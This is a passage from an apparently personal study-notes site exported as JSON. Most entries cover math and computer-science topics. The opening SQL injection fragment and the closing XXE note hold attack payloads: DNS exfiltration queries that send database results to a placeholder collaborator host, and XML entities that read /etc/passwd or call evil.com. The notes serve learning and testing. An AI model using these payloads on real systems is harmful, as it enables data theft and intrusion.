'//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'`\n-   *PostgreSQL* `copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'`\n-   *MySQL* WINDOWS ONLY: `LOAD_FILE('\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\\\a');SELECT ... INTO OUTFILE '\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a'`\n\n### DNS Data Exfiltration\n\n1.  Oracle\n\n    ``` sql\n    SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/\"> %remote;]>'),'/l') FROM dual\n    ```\n\n2.  Microsoft\n\n    ``` sql\n    declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree \"//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a\"')\n    ```\n\n3.  PostgreSQL\n\n    ``` sql\n    --create OR replace function f() returns void as $$\n    declare c text;\n    declare p text;\n    begin\n    SELECT into p (SELECT YOUR-QUERY-HERE);\n    c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';\n    execute c;\n    END;\n    $$ language plpgsql security definer;\n    SELECT f();\n    ```\n\n4.  MySQL\n\n    ``` sql\n    -- WINDOWS ONLY\n    SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a'\n    ```","aliases":null,"description":null},"/notes/Augmented-Matrix-and-Vector-Matrix-Multiplication":{"title":"Augmented Matrix and Vector Matrix Multiplication","date":"2022-02-22T06:46:34+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"- An [[/notes/Augmented Matrix|Augmented Matrix]] can also be written using [[/notes/Matrix-Vector Product|Matrix-Vector Product]] like below:\n\n$$\n\\left[\\begin{array}{ccc|c}  \n 2 & 0 & 1 & 3\\\\  \n 0 & 1 & 1 & 2 \n\\end{array}\\right]\n$$\n$$\n\\begin{bmatrix}\n2 & 0 & 1 \\\\\n0 & 1 & 1\n\\end{bmatrix}\n\\begin{bmatrix}\nx_1 \\\\\nx_2 \\\\\nx_3\n\\end{bmatrix}=\n\\begin{bmatrix}\n3 \\\\\n2\n\\end{bmatrix}\n$$"},"/notes/Rank":{"title":"Rank","date":"2022-02-27T12:11:51+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The rank of a [[/notes/Matrixes|matrix]] $A$, denoted by $Rank(A)$, is the [[/notes/Dimension|Dimension]] of the [[/notes/Column Space|Column Space]] of $A$.\n\n> If $A$ is a matrix of size $m \\times n$, then $Rank(A) + dim(Nul(A)) = n$"},"/notes/AVL-Tree-Operations":{"title":"AVL Tree Operations","date":"2022-01-02T10:46:07+03:00","description":null,"tags":["cs/data-structures","cs/algorithms","cs/trees"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"## Insertion\nAfter inserting into an AVL Tree, which works just like a [[/notes/Binary Tree|Binary Tree]], we insert the node into the tree, we traverse upwards from the inserted node, checking if the AVL property is broken at any point in the tree. If that is the case, we apply [[/notes/Binary Tree Restructuring|trinode restructuring]] and that is enough to fix the AVL property for this subtree and all the ancestors of that node.\n\n## Deletion\nAgain, deletion works just like [[/notes/Deleting  From A Binary Search Tree|deletion from a BST]],  once it is done, we again move upwards from the node checking if AVL property is broken, and fix any nodes that break it. In this case, one restructuring is not enough, we need to traverse until the root of the tree."},"/notes/Multiway-Search-Trees":{"title":"Multiway Search Trees","date":"2022-01-03T12:44:50+03:00","description":null,"tags":["cs/data-structures","cs/trees"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Multiway search trees are basically search trees, just like [[/notes/Binary Search Trees|Binary Search Trees]] except that they don't have to be binary trees and each node can have more than one entries. Basically, a multiway tree node can have $n$ entries, which are stored in the node in an ordered manner. A node with $n$ entries can have $n+1$ children. The rule is that, the entries in the kth child needs to be between the values of $k-1$th and $kth$ entriesin the parent. Assuming ofcourse that $k_0=-\\infty$ and $k_{n+1}=\\infty$\n![[images/2C46C726-E7C4-4EED-AF0D-54D754C4D74C.gif]]"},"/notes/Adjacency-Map":{"title":"Adjacency Map","date":"2022-01-23T03:24:46+01:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"I an adjacency map, each vertice in the [[/notes/Graphs|graph]] is mapped to a list of every [[/notes/Vertice Terminology#^39dda4|incident]] edge. Similar to the [[/notes/Edge List|Edge List]], it uses $O(n+m)$ space."},"/notes/Binomial-Coefficient":{"title":"Binomial Coefficient","date":"2022-01-19T09:46:51+01:00","description":null,"tags":["math/analysis"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"A binomial coefficient is written in the form $\\binom{n}{k}$ and calculated as $$\\frac{n^{\\underline{k}}}{k!}$$. The $\\underline{k}$ here is a falling factorial, which is calculated with\n\n$$\nn^{\\underline{k}} = n \\times (n-1) \\times (n-2)...\\times (n-k)\n$$"},"/notes/Fubinis-Theorem":{"title":"Fubini's Theorem","date":"2022-03-06T08:14:52+01:00","description":null,"tags":["math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Fubini's theorem for [[/notes/Double Integrals Over Rectangles|Double Integrals Over Rectangles]] is that for a rectangle $D = [a,b] \\times [c,d]$ the integral can be written as:\n\n$$\n\\iint_D f(x,y)dA = \\int_a^b\\int_c^df(x,y)dydx = \\int_c^d\\int_a^bf(x,y)dxdy\n$$\n\n> Note that the order of the integrals as well as the order of the $dx$ and $dy$ are important in this case"},"/notes/Radix-Sort":{"title":"Radix Sort","date":"2021-12-24T04:28:25+01:00","description":null,"tags":["cs/sorting","cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Radix sort is a non-comparison based sorting algorithm, it allows us to do stable sorting in a fast manner for elements that are more complicated than integers. In radix sort, when sorting a list of tuples with two elements, [[/notes/Bucket Sort|Bucket Sort]] is applied two times, once for the second element, and once for the first one.This way, the elements with the same first elements are consecutive and ordered according to their second elements. This algorithm allows for a **lexicographic** sorting of a list with $n$ tuples, each element of the tuples being in the range $[0,N-1]$ in $O(n+N)$ time."},"/notes/Double-Integrals-Over-General-Functions":{"title":"Double Integrals Over General Functions","date":"2022-03-06T08:40:25+01:00","description":null,"tags":["math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Calculating [[/notes/Double Integrals Over Rectangles|Double Integrals Over Rectangles]] is nice, but do you know what is nicer? Calculating double integrals over any area. All the cool kids do it these days. Am I too high on caffeine while writing this note? Irrelevant. What is relevant is how you calculate the integral of a [[/notes/Multivariable Functions|multivariable function]] over any area $A$. What you do is you split the area into two functions, and the functions you pick actually define how you calculate the integral. There are two possible cases depending on the regions you want to calculate:\n\n## Type 1 Regions\nA graph is said to be type 1 if it lies between the graph of two functions of $x$. For a type 1 graph, you write down two functions $g_1(x)$ and $g_2(x)$ which form the region $A$ between the lines $y=a$ and $y=b$. Once you have got these functions, it is simple:\n\n$$\n\\int_a^b\\int_{g_1(x)}^{g_{2(x)}}f(x,y)dxdy\n$$\n\n## Type 2 Regions\nType 2 regions are the same as type 1 regions except the functions are of $y$ this time. I won't be explaining this any longer since it is the same idea with type 1 regions so you should be reason and understand it yourself. After all, you are not stupid right? Right?.."},"/notes/Hash-Collision-Handling":{"title":"Hash Collision Handling","date":"2021-12-31T01:21:45+03:00","description":null,"tags":["cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Since we apply [[/notes/Hash Compression|Hash Compression]] in [[/notes/Hash Tables|Hash Tables]], hash collisions may occur often, so handling the collisions becomes critical in order to sustain an efficient [[/notes/Big-Oh Notation|time complexity]].\n\n## Seperate Chaining\nIn this method, each entry in an array points to a linked list. This method works, but it makes this implementation susceptible to running in $O(n)$ time if every element added to the map has the same hash value. In order to prevent this, the $\\lambda$ of this map, ($\\lambda = n/N$) where $n$ is the number of elements in an array, and $N$ is the size of the map. In order to sustain an efficient hash map, the **load factor** must be kept under 1.\n\n## Open Addressing\nIn order to avoid using buckets, we can instead use the array itself to store the colliding elements. Even though it is not as easy as seperate chaining, it uses less space."},"/notes/Depth-First-Search":{"title":"Depth-First Search","date":"2022-01-24T02:15:36+01:00","description":null,"tags":["cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Depth first search is a traversal algorithm for [[/notes/Graphs|Graphs]]. In DFS, edges are explored until we hit a dead-end where we can go to an unvisited vertice and we backtrack until the last decision point after that. Here is pseudocode for DSF:\n\n```\nDFS(G, v):\n\tv.color()\n\tfor(u in G.getNeighbours(v))\n\t\tif(!u.isColored)\n\t\t\trecord edge (v,u) as u's discovery edge\n\t\t\tDFS(G,u)\n```\n\n\nDFS runs in $O(n_s+m_s)$ time where $n_s$ and $m_s$ are the number of vertices and edges reachable from the start vertice $s$, respectively. However, for this to hold, two conditions must be satisfied:\n\n* We must be able to access the outgoing edges of a vertice in at least $O(deg(v))$ time.\n* We must be able to mark a vertice as visited in $O(1)$ time.\n\n> IMPORTANT: When running DFS, you are not guaranteed to find the shortest path between two nodes, you can only check whether there is a path."},"/notes/Tree":{"title":"Tree","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.322597","content":"Trees are **hierarchical** data structures, with each element having one parent(except the root) and each element having at least one child(except the leaves)","tags":null,"aliases":null,"description":null},"/notes/Vertical-Asymptotes":{"title":"Vertical Asymptotes","date":"2021-11-25T01:27:30+01:00","tags":["math/analysis","math/calculus"],"lastmodified":"2022-06-19T20:46:41.322597","content":"Vertical asymptotes are asymptotes where the value of a function $f(x)$ is undefined at a certain point a and the function goes to infinity as x approaches x. Such asymptotes often occur in two cases:\n* $f(x)$ has a logarithm: In this case, $log(x) = -\\infty$ as x approaches 0,  so the vertical asymptote is at the point where the inside of the logarithm is equal to 0.\n* $f(x)$ has a fraction where the denominator is $g(x)$ and there is at least $x \\in \\mathbb{R}$ such that $g(x) = 0$. However, that value is not a vertical asymptote if it makes the numerator of that fraction a 0 as well.\n\nAn example function with asymptotes (the blue one) $f(x) = ln(\\frac{x}{1-x^2})$:\n![[images/20211125004731.png]]","aliases":null,"description":null},"/notes/Geometric-Series":{"title":"Geometric Series","date":"2022-01-17T06:06:44+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"If a [[/notes/Sequences|sequence]] a can be written as:\n\n$$\na_n = cr^n\n$$ \n\nThan this is sequence forms the geometric [[/notes/Series|Series]]:\n\n$$\nS_k = \\sum_{n=1}^k cr^n\n$$\n\nDoing some algebra and some math magic we can derive a more general formula:\n\n$$\nS_k = a\\frac{1-r^k}{1-r}\n$$\n\nThis series [[/notes/Convergent Series|converges]] if $|r| \\leq 1$. This is fairly obvious when you take the limit of the equation above:\n\n$$\n\\lim_{k\\to\\infty} a\\frac{1-r^k}{1-r}\n\na \\lim_{k\\to\\infty} \\frac{1-r^k}{1-r}\n$$\n\nSince $r^k$ only goes to $0$ when $|r|$ is less than 1 it converges into:\n\n$$\n\\frac{a}{1-r}\n$$\n\nOtherwise, it is $DIV$."},"/notes/Basis-Vectors":{"title":"Basis Vectors","date":"2022-02-27T10:58:38+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"The basis vectors of a [[/notes/Subspace|Subspace]] $W$ is a set of vectors that are:\n\n1. [[/notes/Linear Indepence and Dependence|Linearly independent]]\n2. [[/notes/Vector Span|Span]] $W$\n\n> A subspace can have more than one basis\n\n> Different bases for the same subspace has the same number of vectors"},"/notes/Rotational-Transformations":{"title":"Rotational Transformations","date":"2022-02-26T02:54:19+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"[[/notes/Linear Transformations|Linear Transformations]] alter the coordinate system such that the origin stays the same. So, they are useful for representing rotations using matrices. In order to represent a rotation with angle $\\varphi$, you can use the matrice below:\n\n$$\n\\begin{bmatrix}\ncos \\varphi & -sin \\varphi \\\\\nsin \\varphi & cos \\varphi\n\\end{bmatrix}\n$$\n\n<iframe height=\"500px\" width=\"100%\" src=\"https://prime-applets.ewi.tudelft.nl/apps/linear-algebra/rotating-house/\"></iframe>"},"/notes/Determinants-of-Special-Matrices":{"title":"Determinants of Special Matrices","date":"2022-03-06T10:53:45+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"It is much easier to calculate the [[/notes/Determinant|determinants]] of some [[/notes/Special Matrices|Special Matrices]].  Especially the diagonal square ones. The determinant of any square diagonal matrice is the multiplication of its diagonal entries."},"/notes/Check-if-a-matrix-is-invertible":{"title":"Check if a matrix is invertible","date":"2022-02-26T07:32:31+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"A [[/notes/Matrixes|matrix]]($A$) of size $n \\times n$ is [[/notes/Inverse Matrix|invertable]] if and only if one of the conditions below hold:\n\n1. $A$ is [[/notes/Equivalent Systems|equivalent]] to $I_n$\n2. $A$ has $n$ pivot positions\n3. The equation $Ax = 0$ only has the [[/notes/Trivial Solution|Trivial Solution]]\n4. The columns of $A$ are linearly independent\n5. The equation $Ax = b$ has at least one solution for each $b$ in $\\mathbb{R}^n$\n6. The column of $A$ [[/notes/Vector Span|span]] $R^n$\n7. $A^T$ is invertible as well\n8. The columns of $A$ form a [[/notes/Basis Vectors|basis]] for $\\mathbb{R}^n$\n9. $Col A = \\mathbb{R}^n$ ([[/notes/Column Space|Column Space]])\n10. $Dim(Col A) = n$ ([[/notes/Dimension|Dimension]])"},"/notes/Relational-Database-Normalization":{"title":"Normalizing a Relational Model","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"When you have a [[/notes/Relational Model|Relational Model]],  it does not necessarily conform to the [[/notes/Good Relational Database Design|What makes a Relational Database Design Good?]] principles. In order to achieve those principles, we use a technique called normalization.","tags":null,"aliases":null,"description":null},"/notes/Solving-Polynomials-in-The-Complex-Plane":{"title":"Solving Polynomials in The Complex Plane","date":"2022-03-06T09:15:52+01:00","description":null,"tags":["math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"When working with polynomials, if a polynomial has a solution that has a [[/notes/Complex Numbers|complex part]], then the **complex conjugate** of this number is also a solution to the polynomial.\n\n> The complex conjugate for a number $z = a + bi$ is $\\bar z = a - bi$"},"/notes/Similar-Matrices":{"title":"Similar Matrices","date":"2022-03-20T08:15:27+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Two [[/notes/Matrixes|matrices]] $A$ and $B$ are said to be similar if there exists an invertable matrix $P$ such that:\n\n$$\nA = PBP^{-1}\n$$\n\nWhen you have such similar matrices and you know that $v$ is an [[/notes/Eigenvectors|eigenvector]] of $B$, $Pv$ must be an eigenvector of $A$ with the same [[/notes/Eigenvalues|eigenvalue]].\n\n$$\nA(Pv) = PBP^{-1}Pv = PBv = P\\lambda v = \\lambda Pv\n$$\n\nBuilding from the definition of the eigenvalues, it is clear that $Pv$ is an eigenvector of $A$ with eigenvalue $\\lambda$."},"/notes/Parametric-Vector-Form":{"title":"Parametric Vector Form","date":"2022-02-27T11:11:01+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"In order to convert a linear system into parametric vector form, first the matrix must be converted to reduced echeleon form. Afterwards, the free variables (the columns that do not have any pivot points) and the basic variables are determined. And then, the equations for each row in the matrix are written down so that the basic variables are represented by the free variables. And then the equations are converted into a summation of vectors and the solutions can simply be generated using that form. Here is a sample solution:\n\n$$\n\\begin{bmatrix}\n-2 & 1 & -4 & 1 \\\\\n-1 & 1 & -1 & 0 \\\\\n0 & 1 & 2 & -1\n\\end{bmatrix}x = \n\\begin{bmatrix}\n4 \\\\\n1 \\\\\n-2\n\\end{bmatrix}\n$$\n\n$$\n\\begin{bmatrix}\n1 & 0 & 3 & -1 \\\\\n0 & 1 & 2 & -1 \\\\\n0 & 0 & 0 & 0\n\\end{bmatrix}x = \n\\begin{bmatrix}\n-3 \\\\\n-2 \\\\\n0\n\\end{bmatrix}\n$$\n\n$$ \n\\begin{cases}  \n-3 = x_1 + 3x_3 - x_4 \\\\\n-2 = x_2 + 2x_3 - x_4 \\\\\nx_3 = s \\\\\nx_4 = t\n\\end{cases} \n$$\n\n$$ \n\\begin{cases}  \nx_1 = x_4 - 3x_3 - 3 \\\\\nx_2 = x_4 - 2x_3 - 2 \\\\\nx_3 = s \\\\\nx_4 = t\n\\end{cases} \n$$\n\n$$\n\\begin{bmatrix}\nx_1 \\\\\nx_2 \\\\\nx_3 \\\\\nx_4\n\\end{bmatrix} = \ns\\begin{bmatrix}\n-3 \\\\\n-2 \\\\\n1 \\\\\n0\n\\end{bmatrix} + \nt\\begin{bmatrix}\n1 \\\\\n1 \\\\\n0 \\\\\n1\n\\end{bmatrix} +\n\\begin{bmatrix}\n-3 \\\\\n-2 \\\\\n0 \\\\\n0\n\\end{bmatrix}\n$$"},"/notes/Analysis-of-Merge-Sort":{"title":"Analysis of Merge Sort","date":"2021-12-21T08:35:42+03:00","description":null,"tags":["cs/analysis","cs/algorithms","cs/sorting"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"Calculating the [[/notes/Big-Oh Notation|Big-Oh Complexity]] of [[/notes/Merge Sort|Merge Sort]] is not a difficult task. There are two ways to do it, one being more intuitive and the other being more mathematical.\n\n## Using the reccurence tree\nWhen you draw a diagram how the merge sort algorithm calls itself recursively, you get a very intuitive yet solid proof that the algorithm's time complexity is $O(nlog(n))$:\n\n![[images/7DEDD8CB-8CFC-4D10-A373-709BBFAC2459.jpeg]]\n\n## Using its [[/notes/Recurrence Equations|recurrence equation]]\nEven though this approach is less intuitive I feel like this is just more solid and has its feet on the ground. Basically, when you write the recurrence equation of $t(n)$ which is the worst case running time of merge sort you get the following:\n$$\nt(n)=\\begin{cases}\nn \\leq 1, & b \\\\\nn > 1, & 2t(\\frac{n}{2}) + cn\n\\end{cases}\n$$\nTurning this into a closed form equation is simple:\n$$\nt(n) = 2t(\\frac{n}{2}) + cn = 2(2t(\\frac{n}{4}) + \\frac{cn}{2}) + cn = 4t(\\frac{n}{4}) + 2cn + = 8t(\\frac{n}{8}) + 3cn = 2^it(\\frac{n}{2^i}) + icn\n$$\nSince the function would continue until $\\frac{n}{2^i}$ is 1 or less, the function would recurse until $i = log(n)$. Therefore, replacing i with that value yields the function:\n\n$$\nt(n) = 2^{log(n)}t(\\frac{n}{2^{log(n)}}) + log(n)cn = nb + cnlog(n)\n$$"},"/notes/Binary-Search-Trees":{"title":"Binary Search Trees","date":"2022-01-01T02:37:16+01:00","description":null,"tags":["cs/data-structures","cs/trees"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"Binary search trees are an extension of the [[/notes/Binary Tree|Binary Tree]] data structure, except it has two extra constraint:\n\n- A node can have two children, the children with the value less than the node's is placed to the left of it, and the one with a higher value is placed to the right.\n- There cannot be two nodes with the same value.\n\nThanks to these properties, binary search trees allow searching for a node in $O(log(n))$ time."},"/notes/MinMax-Points-in-Multivariable-Functions":{"title":"MinMax Points in Multivariable Functions","date":"2022-01-19T05:04:58+01:00","description":null,"tags":["math/multivar","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"[[/notes/Multivariable Functions|Multivariable Functions]] have minima and maxima points, which can be found using [[/notes/Critical Points Multivariable Functions|critical points]]. After finding them,  in order to check whether they are minima, maxima or saddle points, we can either apply the second [[/notes/Partial Derivatives|partial derivate]] test which goes like:\n\n$$\nD = f_{xx}(a,b)f_yy(a,b) - f_{xy}(a,b)^2\n$$\n\n* if $D > 0$ and $f_xx(a,b) > 0$, then $(a,b)$ is a maxima\n* if $D > 0$ and $f_xx(a,b) < 0$, then $(a,b)$ is a minima\n* if $D < 0$ then $(a,b)$ is a saddle point.\n* Otherwise, the test is inconclusive\n\nYou can also look at the [[/notes/Level Lines|Level Lines]] of the function and infer from there:\n\n> In a level map, if two lines intersect, that point is a saddle point"},"/notes/Comparables-and-Comparators":{"title":"Comparables and Comparators","date":"2021-12-14T20:32:21+01:00","tags":["cs/java","cs/doc"],"lastmodified":"2022-06-19T20:46:41.314596","content":"In Java, there are two important interfaces, **comparable** and **comparator**.\n\n## Comparable\nA [comparable](https://docs.oracle.com/javase/8/docs/api/java/lang/Comparable.html) is an interface with a generic. A class implementing it must also implement the `compareTo` function.\n\n## Comparator\n[Comparators](https://docs.oracle.com/javase/8/docs/api/java/lang/Comparable.html) are classes that compare two objects.","aliases":null,"description":null},"/notes/Eulers-Identity":{"title":"Euler's Identity","date":"2022-03-06T09:14:08+01:00","description":null,"tags":["math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Euler's identity is really useful when using [[/notes/Polar Coordinates|Polar Coordinates]], it is also especially useful since it applies perfectly well and very intuitively into the [[/notes/Polar form Multiplication|Polar form Multiplication]] rules.\n\n$$\ne^{in} = cos(n) + isin(n)\n$$"},"/notes/Network-Layers":{"title":"Network Layers","date":"2022-06-18T01:32:24+02:00","description":null,"tags":["cs/networking"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Networking of commputers is split up into several layers:\n\n![[Network Layers_2022-06-18 13.33.29.excalidraw.md]]"},"/notes/Subspace":{"title":"Subspace","date":"2022-02-27T10:32:49+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.322597","content":"A subspace of $\\mathbb{R}^n$ is a subset $W \\in \\mathbb{R}^n$. For a subset to be considered a *subspace*, it must conform to the following conditions:\n\n1. The zero [[/notes/Vectors|vector]] must be in $W$\n2. If $v$ and $u$ is in $W$, $u + v$ must also be in $W$, as well as the [[/notes/Vector Span|Vector Span]] of those two vectors"},"/notes/Homogenous-Linear-System-Solutions":{"title":"Homogenous Linear System Solutions","date":"2022-02-23T12:39:14+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"A [[/notes/Homogenous Linear Systems|homogenous linear system]] can have another solution than the [[/notes/Trivial Solution|Trivial Solution]] iff it has a [[/notes/Free and Basic Variables|free variable]]. This is because if there are no free variables, than the system has [[/notes/Solutions of Linear Systems|only one solution]]."},"/notes/Compilers":{"title":"Anatomy of a compiler","date":"2021-11-16T21:07:41+01:00","tags":["cs/compiler","cs/low-level"],"lastmodified":"2022-06-19T20:46:41.314596","content":"- [ ] Split this note into multiple notes\n# Anatomy of a compiler\n\n[Compilation Diagram](./static/Anatomy_of_a_compiler/2021-06-06T13:21:22.png)\n\n## Front-End analysis\n\n1.  **Lexical analysis:** Lexical analysis is the process of taking the source code as a stream of characters and splitting it into `tokens` (Tokens are sequences of characters that have a collective meaning.).\n\n2.  **Syntax analysis & Parsing:** Syntax analysis is the process of parsing a sequence of tokens generated in lexical analysis and outputting a `parse-tree` or a `derivation`.\n\n3.  **Semantic Analysis:** In semantic analysis we check the code for non-syntactic but semantic errors. These errors include improper arguments, access violations and undeclared variables. An example of a semantic error is:\n\n    ``` python\n    foo = [1,2,3]\n    foo + 2 # You can't add an int to a list\n    ```\n\n4.  **Intermediate Code Generation:** In this step we create the `intermediate representation` of the source code. Intermediate representation should be easy to generate and translate to the target program. A very common form is the `three-address code(TAC)` which is a sequence of simple instructions with at most three operands.\n\n```\n      real code            TAC\n      -------------------- ------------","aliases":null,"description":null},"/notes/Heap":{"title":"Heap","date":"2021-12-14T20:32:21+01:00","tags":["cs/data-structures","cs/trees"],"lastmodified":"2022-06-19T20:46:41.318597","content":"A heap is basically a [[/notes/Binary Tree|Binary Tree]] which is complete([[/notes/Full & Complete Trees|Full vs Complete Binary Trees]]) and every child of a parent node ([[/notes/Tree Terminology|Important Tree Terminology]]) has a value greater than or equal to the parent's value. \n\n## Analysis of a min-heap\n|operation|[[/notes/Big-Oh Notation|Big-Oh Notation]]|\n|----------|------------------|\n|size|$O(1)$|\n|min|$O(1)$|\n|insert|$O(log(n))$|\n|removeMin|$O(log(n))$|","aliases":null,"description":null},"/notes/Integrity-Constraints":{"title":"Integrity Constraits","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"Integrity contraints are useful to sustain the integrity of a database as insertions are made. They are hard to represent in [[/notes/ER Diagrams|ER Diagrams]], except some structural constraints(keys, functionalities), so we add them in anotations.","tags":null,"aliases":null,"description":null},"/notes/Eigenvectors":{"title":"Eigenvectors","date":"2022-03-20T06:03:22+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Eigenvectors are [[/notes/Vectors|Vectors]] which remain in the same span when a [[/notes/Linear Transformations|linear transformation]] $A$ is applied to them. However, they can be scaled up or down. An eigenvector is represented algebraically as:\n\n$$\nAx = \\lambda I x\n$$\n\nwhere $I$ is the [[/notes/Special Matrices#^81da11|identity matrix]]. This can also be rewritten as:\n\n$$\n(A - \\lambda I)x = 0\n$$\n\nThis linear system can have $1$ or $\\infty$ solutions, since the $0$ vector is always a solution to the system(because of the [[/notes/Linear Transformations#^81460d|0 property of linear transformations]]).\n\nThe $\\lambda$ here is called the [[/notes/Eigenvalues|eigenvalue]] of the eigenvector $x$."},"/notes/Quick-Sort-Pivot-Selection":{"title":"Quick Sort Pivot Selection","date":"2021-12-23T01:05:53+03:00","description":null,"tags":["cs/algorithms","cs/sorting"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The most important aspect in a quick sort algorithm is how the pivot is chosen, the pivot decides how well-balanced the recursion tree of the algorithm turns out to be. An ideal pivot selection results in a [[/notes/Full & Complete Trees|complete]] binary recursion tree. There are several methods for choosing a pivot:\n\n## Blindly Picking the Last Element\nBlindly picking the last element makes the impementation susceptible to having a [[/notes/Big-Theta Notation|Big-Theta Notation]] of $\\Theta(n^2)$ if the provided array is sorted in an ascending order.\n\n## Random selection\nRandomly selecting the pivot point in each iteration will result in a time complexity of $O(nlog(n))$\n\n## Median of three\nWhen picking a pivot, another approach is to just pick the median of the first, last and middle element. This too results in a complexity of $O(nlog(n))$, and in my opinion this is a more robust approach."},"/notes/Ratio-Test":{"title":"Ratio Test","date":"2022-01-18T09:39:22+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Let $\\sum a_n$ be a series such that $a_n \\neq 0$. Then, calculating the limit \n\n$$\n\\lim_{n\\to\\infty} \\frac{|a_{n+1}|}{|a_n|} = L\n$$\n\nWe have three cases: \n\n* If $L < 1$, the series converges\n* If $L > 1$ the series diverges\n* If $L = 0$ or the limit is non-existent, then the test is inconclusive"},"/notes/Square-Root-Trick-Limit":{"title":"The Square Root Trick","date":"2021-11-24T18:41:59+01:00","tags":["cs/calculus"],"lastmodified":"2022-06-19T20:46:41.322597","content":"When you run into the indeterminate form([[/notes/Indeterminate Forms in Limits|Indeterminate Forms and Dealing with Them]])  $\\frac{0}{0}$ while taking the limit of a function $f$ and either the numerator or denominator of the function is in the form $a + b\\sqrt{c}$, you can just multiply both sides of the fraction with $a-b\\sqrt{c}$ and then calculate the limit from there.\n\n> HOT TIP! If you run into the case where both sides are of the form above, you can do the method twice, once for the numerator and once for the denominator, this should get you to the answer in most cases.","aliases":null,"description":null},"/notes/XXE":{"title":"XXE Injection","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/web"],"lastmodified":"2022-06-19T20:46:41.322597","content":"- [ ] Split this into multiple notes\n# XXE Injection\n\nThe XML format allows users to specify entities which can be used inside the XML document using the formant `&entityname;`. These entities can be fetched over the network or can be read from a file using payloads such as:\n\n``` xml\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://evil.com\"> ]>\n```\n\nThis opens up the door to two different vulnerabilities: Retrieving Local Files and Server Side Request Forgery\n\n## Retrieving Files\n\nEven though XXE can be used to read files, it often can\\'t be used to list the contents of a directory. However, we can test whether an XXE vulnerability exists, we ca try and read a file that exists on every system and that can be read by every user. In linux, that file is `/etc/passwd` and in windows, that is `/c:/server_files/application.conf`. An example test payload for linux would be:\n\n``` xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY passwd SYSTEM \"file:///etc/passwd\"> ]>\n<yeet>&passwd;</yeet>\n```\n\n## SSRF\n\n### Regular XXE\n\nThis bug can be tested by sending an XML document with an external entity that points to a known resource on the network. If a DNS or HTTP request is sent to that server after sending the XML request, an XXE vulnerability exists. However, this method doesn\\'t always work since some systems block external entities on a network. Here is an example payload:\n\n``` xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY network SYSTEM \"http://evil.com\"> ]>\n<yeet>&network;</yeet>\n```\n\n### Blind XXE\n\nSometimes, when a server\\'s response doesn\\'t contain any part of the sent XML body, an XXE vulnerability might still exist. This can be tested using the Burp Collaborator.\n\n### XML Parameter Entities\n\nSometimes,applications block using entities for security reasons. However you can still inject external entities using *XML Parameter Entities*. Here is a sample payload:\n\n``` xml\n<?xml version=\"1.0\" 